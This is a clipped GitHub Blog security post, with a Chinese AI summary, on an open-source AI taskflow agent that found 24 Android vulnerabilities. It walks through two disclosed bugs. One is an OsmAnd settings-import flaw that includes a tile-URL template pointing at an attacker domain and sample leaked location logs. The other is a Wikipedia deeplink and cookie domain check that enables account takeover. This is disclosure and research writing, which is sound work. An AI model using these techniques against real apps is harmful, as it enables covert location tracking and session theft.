---
title: How we found 24 Android vulnerabilities using our open source AI security agent
source: https://github.blog/security/how-we-found-24-android-vulnerabilities-using-our-open-source-ai-security-agent/
source_host: github.blog
clip_date: 2026-09-29T03:12:14+08:00
trace_id: 02583cc9-5866-449d-9e2e-fa18cf26c431
content_hash: 015595643417b817782c2ce87d9cd1103bbebe5388d04666813236c8b6513f6b
status: synced
tags:
  - 漏洞分析
  - AI辅助逆向
series: null
feed_source: GitHub Blog·Security
ai_summary: 开源 AI 审计 taskflow 已从 Android 应用中挖出并报告 24 个漏洞，证明 LLM 能发现 WebView 跨应用脚本、Deeplink 逻辑缺陷等高危问题。
ai_summary_style: key-points
images_status:
  total: 2
  succeeded: 2
  failed_urls: []
notion_page_id: 3e975244-d011-8116-9057-d7d601a3e74a
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> 开源 AI 审计 taskflow 已从 Android 应用中挖出并报告 24 个漏洞，证明 LLM 能发现 WebView 跨应用脚本、Deeplink 逻辑缺陷等高危问题。
> 
> - **工具与成果：** 基于 GitHub Security Lab Taskflow Agent 编写手机应用审计流程，累计报告 24 个 Android 漏洞，含若干严重级问题。
> - **运行方式：** 在 seclab-taskflows 仓库启动 codespace，执行 `./scripts/audit/run_mobile.sh myorg/myrepo`；需 Copilot 许可并消耗大量 token，中等仓库约 1–2 小时，结果存于 SQLite 的 `audit_results` 表（`has_vulnerability` 列打勾者）。
> - **流程定制：** 新增 `gather_mobile_entry_point_info.yaml` 把入口点区分为移动/非移动入口；修改 `classify_application_local.yaml`，针对入口类型强制检查特定漏洞类（如 intent 入口对应 confused deputy、不安全广播），并以"严格提示+多次运行"降低漏报。
> - **已披露案例：** OsmAnd 的导出 MapActivity 可被任意应用附带 extras（`silent_import`、`replace`、`export_type_list_key` 等）静默导入设置、篡改瓦片 URL，从而回传用户坐标与路线起终点；Wikipedia 应用 `wikipedia://` deeplink 的域名 `endsWith` 校验缺陷叠加 Cookie 域匹配同类问题，可加载 evil-wikipedia.org、注入 JS 并窃取长期 cookie，实现账号接管。
> - **已知局限：** LLM 找漏洞能力强但严重性判断差，常报低危或依赖极端前置条件的误报（如仅可写外部存储的路径遍历、内外部存储优先级未考虑），每条发现仍需移动安全研究员人工复核，必要时多轮生成 PoC 验证。

With the rise of AI in the security space, our team created the [GitHub Security Lab Taskflow Agent](https://github.blog/security/community-powered-security-with-ai-an-open-source-framework-for-security-research/) as a way for security researchers to easily automate, package, and share the AI prompts and workflows that they find effective for their work. In this blog post, I’ll share how I created auditing taskflows to find vulnerabilities in Android applications.

While new models are getting better at understanding code, custom taskflow prompts let security researchers guide them—splitting research into incremental steps to help the LLM find complex vulnerabilities faster, or that it would have missed entirely.

Using these taskflows, I’ve reported more than 20 vulnerabilities in Android applications. You can check out our [advisories page](https://securitylab.github.com/ai-agents/) to see when new vulnerabilities are disclosed. Otherwise, keep reading for a few concrete examples of high-impact vulnerabilities that these taskflows found.

## How to run the taskflows on your own project

Want to get started right away? The taskflows are open source and easy to run yourself. Please note: A GitHub Copilot license is required, and the prompts will use premium model requests. Running the taskflows can result in many tool calls, which can easily consume a large amount of tokens.

1.  Go to the seclab-taskflows repository and start a codespace.
2.  Wait a few minutes for the codespace to initialize.
3.  In the terminal, run `./scripts/audit/run_mobile.sh myorg/myrepo`

It might take an hour or two to finish on a medium-sized repository. When it finishes, it’ll open an SQLite viewer with the results. Open the “audit_results” table and look for rows with a checkmark in the “has_vulnerability” column.

## Creating targeted audit taskflows for Android apps

My colleagues Peter and Mo previously wrote a [blog post](https://github.blog/security/how-to-scan-for-vulnerabilities-with-github-security-labs-open-source-ai-powered-framework/) about their audit task flows. Although those taskflows already work well on their own, Android applications have their own specific classes of vulnerabilities that we’d like the taskflows to focus on, so we need to guide them.

First, I added a taskflow called `gather_mobile_entry_point_info.yaml`. Entry points are places in the code that attacker-controlled data could flow through. This taskflow takes the entry points and separates them into mobile entry points and non-mobile entry points. This allows the AI to run on repos that contain a variety of different application types—a mobile application, web servers, desktop applicationswhile still understanding the correct attack surface.

Second, I edited `classify_application_local.yaml`. In it, I specify a list of popular vulnerability classes and ask the LLM to consider them in the context of each entry point and component. Since mobile application vulnerabilities are less widely known and LLMs are non-deterministic, we should ensure the LLM checks for certain essential vulnerabilities classes. For example, if in the previous step the taskflow identified an intent-based entry point, then it should have a list of common intent-based vulnerabilities it will check for, such as confused deputy or insecure broadcasts. This helps the LLM find connections between components and maintain an overview of the threat model.

By combining both prompts across multiple runs, we get the best of each: the strict prompt and repeated runs ensure obvious vulnerabilities aren’t missed, while the broad prompt lets the AI apply its creativity to the fullest.

## Two examples of vulnerabilities found by the taskflows

In this section, we’ll show two examples of vulnerabilities that were found by the taskflows and that have already been disclosed. In total, we have found and reported 24 vulnerabilities so far.

### Tracking Users via OsmAnd

OsmAnd is a popular third-party navigation app that uses Open-Street-Map as its main data source. Available on both the App Store and Play Store, we will look at the Android version, which has over 10 million downloads. In this section, we will look at the most interesting of the three vulnerabilities that were discovered: a vulnerability that allows malicious apps to track the location of the device.

OsmAnd exports an activity called MapActivity. An Android *activity* is a single, focused screen in an app that provides a UI for the user to interact with. MapActivity handles opening settings files and deeplinks within the app and is exported. An *exported activity* is an activity that can be launched by components outside of its own app.

![screenshot of an android.xml file](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d9dff5475a23f1bd.png)

screenshot of an android.xml file

However, when opening settings files, the app allows for intent extras (`settings_version`, `silent_import`, `replace`, `export_type_list_key`). **Intents** are messaging objects in Android used to request an action from another app component, and **intent extras** are key-value pairs of data attached to an intent to pass information along with that request. MapActivity only expects these extras to come from an AIDL service. They should have been passed through an in-process channel instead of intent extras, because **any app can put arbitrary extras on any intent to any exported activity**. Android provides no mechanism to restrict which extras an external caller can set.

Because MapActivity is exported, any app can send an [intent](https://developer.android.com/reference/android/content/Intent) to the activity with any [extras](https://developer.android.com/reference/android/content/Intent) we want, including intent extras that can allow us to import settings to the app undetected. The Android app uses the handleOsmAndSettingsImport function to import the following settings:

-   SilentImport: allows importing without a notification
-   Replace: allows us to replace instead of just add settings
-   SettingsTypes: allows us to import without a user confirmation

```plaintext
private void handleOsmAndSettingsImport(Uri intentUri, String fileName, Bundle extras) { 
    fileName = fileName.replace(ZIP_EXT, ""); 
    if (extras != null && CollectionUtils.containsAny(extras.keySet(), 
            SETTINGS_VERSION_KEY, SETTINGS_LATEST_CHANGES_KEY)) { 
        int version = extras.getInt(SETTINGS_VERSION_KEY, -1); 
        String latestChanges = extras.getString(SETTINGS_LATEST_CHANGES_KEY); 
        boolean replace = extras.getBoolean(REPLACE_KEY);              // ← attacker-controlled 
        boolean silentImport = extras.getBoolean(SILENT_IMPORT_KEY);   // ← attacker-controlled 
        ArrayList<String> exportTypeKeys = 
            extras.getStringArrayList(EXPORT_TYPE_LIST_KEY);           // ← attacker-controlled 
        List<ExportType> exportTypes = null; 
        if (exportTypeKeys != null) { 
            exportTypes = ExportType.valuesOf(exportTypeKeys); 
        } 
        handleOsmAndSettingsImport(intentUri, fileName, exportTypes, 
            replace, silentImport, latestChanges, version); 
    } else { 
        handleOsmAndSettingsImport(intentUri, fileName, 
            null, false, false, null, -1);                             // safe defaults 
    } 
} 
```

Since we can now import any settings we want, we can make several critical changes. For example, we can replace tiles on the map. OsmAnd formats the URL for each tile in the following format:

```
return MessageFormat.format(urlTemplate, zoom + "", x + "", y + "");
```

By default, OsmAnd uses local tiles, however we can overwrite the default tile files with the following URL:

```
f"{ATTACKER_DOMAIN}/tiles/{{0}}/{{1}}/{{2}}.png",
```

Then, we can leak the exact x, y coordinates of every tile. The URL expects the response of that URL to contain an image for the tile so on the attacker server backend, we serve the according tile from OpenStreetMaps. The attacker has a list of the x, y coordinates of every tile the user had loaded on the OsmAnd app, and the user has no idea the settings of their app have been changed. This allows any app, even one with no permissions, to overwrite the settings of OsmAnd and send back private location data to their server.

```bash
# [TILE #1]  14:23:07  z=15 x=9649 y=12320 
#   ├── center: 40.70979, -73.98743 
#   └── 🗺️  https://www.openstreetmap.org/#map=15/40.70979/-73.98743
```

Using the same vulnerability, we can also obtain the origin and destination for every route a user takes on OsmAnd sent to our attacker server, without any change noticeable to the user.

```bash
[ROUTE #1] 07:02:47  vehicle=car  waypoints=2 
  ├── path: /osrm/car/-122.084,37.4219983;-122.32450103759766,37.99944305419922 
  ├── 📍 ORIGIN:      37.421998, -122.084000 
  │      https://www.openstreetmap.org/#map=15/37.42200/-122.08400 
  ├── 🏁 DESTINATION: 37.999443, -122.324501 
  │      https://www.openstreetmap.org/#map=15/37.99944/-122.32450
```

### Wikipedia account takeover Via deeplink

Next, we’ll look at the Wikipedia Android app, which allows users to browse Wikipedia on their phones. To browse Wikipedia webpages within the app, the Wikipedia Android app registers a hook for the wikipedia:// deeplink to open the app. For example, a deeplink may look like `wikipedia://wikipedia.org/wiki/PoC`. However, a logic bug in the hostname parser allows us to load non-Wikipedia URLs.

```plaintext
    private fun handleIntent(intent: Intent) { 
        if (Intent.ACTION_VIEW == intent.action && intent.data != null) { 
            // TODO: handle special cases of non-article content, e.g. shared reading lists. 
            intent.data?.let { 
                if (it.authority.orEmpty().endsWith(WikiSite.BASE_DOMAIN)) { 
                    // Pass it right along to PageActivity 
                    val uri = Uri.parse(it.toString().replace("wikipedia://", WikiSite.DEFAULT_SCHEME + "://")) 
                    startActivity(Intent(this, PageActivity::class.java) 
                            .setAction(Intent.ACTION_VIEW) 
                            .setData(uri)) 
                } 
            } 
        } 
    } 
```

This primitive allows us to direct the user to any website of our choosing using a wikipedia:// deeplink, and trick the user into thinking they are on the Wikipedia page, when they are, in fact, on an attacker-controlled page. Additionally, the attacker is able to run arbitrary JavaScript in the app’s WebView, a dangerous primitive that gives the attacker an entry point to environments that are normally considered safe. This vulnerability pattern occurs not once, but twice in the same app:

```plaintext
// SharedPreferenceCookieManager.kt:101 
if (domain.endsWith(domainSpec)) { 
    buildCookieList(cookieList, cookiesForDomainSpec, null) 
} 
```

This second snippet checks whether a page should contain cookies from wikipedia.org page. Using both issues, we can leak all the cookies from the Wikipedia page, which are long-lived.

Chaining these two vulnerabilities together, we get a powerful account takeover.

1.  The victim accesses a malicious webpage on their browser containing a deeplink and clicks on it.
2.  The Wikipedia Android app opens automatically and loads an attacker-controlled page that ends with wikipedia.org, such as evil-wikipedia.org. The victim thinks it’s a page on Wikipedia, and the app automatically sends the user’s cookies. The attacker now has access to the victim’s username, long-lived token, and session token valid across every Wikimedia project (all Wikipedias, Commons, Wikidata, Meta, etc.).

As these examples show, LLMs can find logic vulnerabilities with critical impact, not just generic bug classes.

## LLMs are good at finding vulnerabilities but struggle at estimating severity

LLMs are good at finding vulnerabilities, even to the point of finding low severity bugs that are not very impactful. Many times, I found that the AI would return issues that required very specific states that would be almost impossible to find in real life situations. Additionally, it often reported low-severity vulnerabilities, even when specifically told not to do so. Because of this, each finding should be reviewed by a security researcher with knowledge of mobile applications.

Another problem we found was that the severity of vulnerabilities was often estimated incorrectly. The actual impact of a vulnerability often changes due to mitigating factors; that lower its severity.

Take for example a path traversal in an Android app where the filepath is restricted to the external storage; the relative severity of such an issue is low. Such mitigating factors are hard for the LLM to see without explicit prompting to “create a proof of concept,” requiring multiple runs not just for finding vulnerabilities, but also creating proof of concepts, which forces the LLM to try to exploit the vulnerability. Depending on the availability and speed of the model, this requires the model to use extra time on vulnerabilities that may not have very strong impact.

Even then, the LLM can still get things wrong. For example, if the app uses data from both internal and external storage, the internal storage data is often given priority. The LLM may assume that data from external storage—which we can write to via our path traversal—will change the application’s actual data. But if internal storage overwrites our attacker-controlled external data, there’s no vulnerability at all. Such complex behaviors lead to false positives, which will decrease as LLM models’ contexts grow bigger and their reasoning improves. But for now, the only way to fix these issue is to give the LLM a debugger to run the proof of concept and original code, or for a researcher to prompt the LLM to look specifically for these issues.

## LLMs have great knowledge of API behavior

Any security researcher who specializes in a particular language knows the common code patterns: which functions are safe and which are unsafe. For example, using `path.Clean` in Go is much less safe than using `filepath.Clean` and is often the cause of many vulnerabilities that affect Windows versions of popular products. We were surprised to see how well the LLM was able to understand the behavior of common security relevant APIs in various languages, even without access to the language source code. Most proof of concepts that we ask the LLM to produce after giving it a vulnerability report required little modification on our end, demonstrating its deep knowledge of previous security exploits and API behavior.

## Notes on the results

At the time of writing this blog, we found 24 Android vulnerabilities in mobile applications. In many cases, we found simple vulnerabilities in applications such as path traversal. We found a handful of critical vulnerabilities, some of which have been presented in this blog post. Since Android app security is quite strong, the types of vulnerabilities are exactly where a security researcher would expect to find them, such as cross app scripting in a WebView, or exposed JavaScript bridges.

![Chart showing GHSLs and Average CVSS for 12 CWEs.](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/f1b9814d81f4a32f.svg)

Chart showing GHSLs and Average CVSS for 12 CWEs.

We believe that AI-powered security research is one of the best ways to secure open source projects currently, and its power can be used for web applications, mobile applications as well as desktop applications.

## Closing

We strongly believe that security should be a top priority for all open source maintainers, and we know that AI will be an essential tool for all maintainers in the coming years, both for development and security. The `seclab-taskflow-agent` will help you get started with security in a couple minutes and is open to contributions for those who find interesting and unique prompts, tools and mechanisms for finding vulnerabilities with AI.

Start securing your project today. Run these taskflows against your own app and take the first step toward AI-assisted security!

The post [How we found 24 Android vulnerabilities using our open source AI security agent](https://github.blog/security/how-we-found-24-android-vulnerabilities-using-our-open-source-ai-security-agent/) appeared first on [The GitHub Blog](https://github.blog/).
